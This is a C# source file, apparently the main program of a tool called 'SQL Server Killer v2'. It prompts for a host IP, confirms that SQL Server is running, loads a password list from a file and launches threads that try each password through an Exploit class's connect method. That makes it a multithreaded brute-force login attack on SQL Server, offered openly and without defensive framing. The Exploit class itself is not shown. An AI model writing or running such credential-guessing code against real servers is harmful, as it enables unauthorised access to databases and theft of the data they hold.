using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace SQL_Server_Killer_v1
{
    class Program 
    {
        public static List<string> passwords = new List<string>();
        

        static void Main(string[] args)
        {
            Console.Title = "SQL Server Killer v2 by rummykhan";

            Console.Write("Enter Host IP : ");
            string ip = Console.ReadLine();
            Console.WriteLine("");

            if (GenericFunctions.checkNode(ip))
            {
                GenericFunctions.logNotification("Host is Live and running SQL Server..");

                passwords = GenericFunctions.getPasswordFromFile();

                if (passwords != null)
                {
                    if (passwords.Count > 0)
                    {
                        GenericFunctions.logNotification("Total passwords loaded are : " + passwords.Count);

                        List<string> topFewPasswords = new List<string>();
                        int total = passwords.Count;
                        int skip = 5;
                        while (total > 0)
                        {
                            int next = total - skip;

                            if (next >= 5 || total >= 5)
                            {
                                total -= skip;
                                next = skip;
                                //gkgkgj
                            }
                            else
                            {
                                next = total;
                                total -= next;
                            }

                            topFewPasswords = passwords.GetRange(0, next);
                            passwords.RemoveRange(0, next);
                            startThreads(ip, topFewPasswords);
                        }
                    }
                    else
                        GenericFunctions.logError("Password File is probably empty..!!");
                }

            }
            else
            {
                GenericFunctions.logError("Host is Dead..!!");
                GenericFunctions.logNotification("Press any key to exit..");
                Console.ReadKey();
            }

        }

        static void startThreads(string ip, List<string> topPasswords)
        {
            Exploit exploit = new Exploit();

            foreach (var password in topPasswords)
            {
                string[] ipAndPassword = { ip, password };
                Thread t = new Thread(new ParameterizedThreadStart(exploit.tryConnect));
                t.Start(ipAndPassword);
            }

        }
    }
}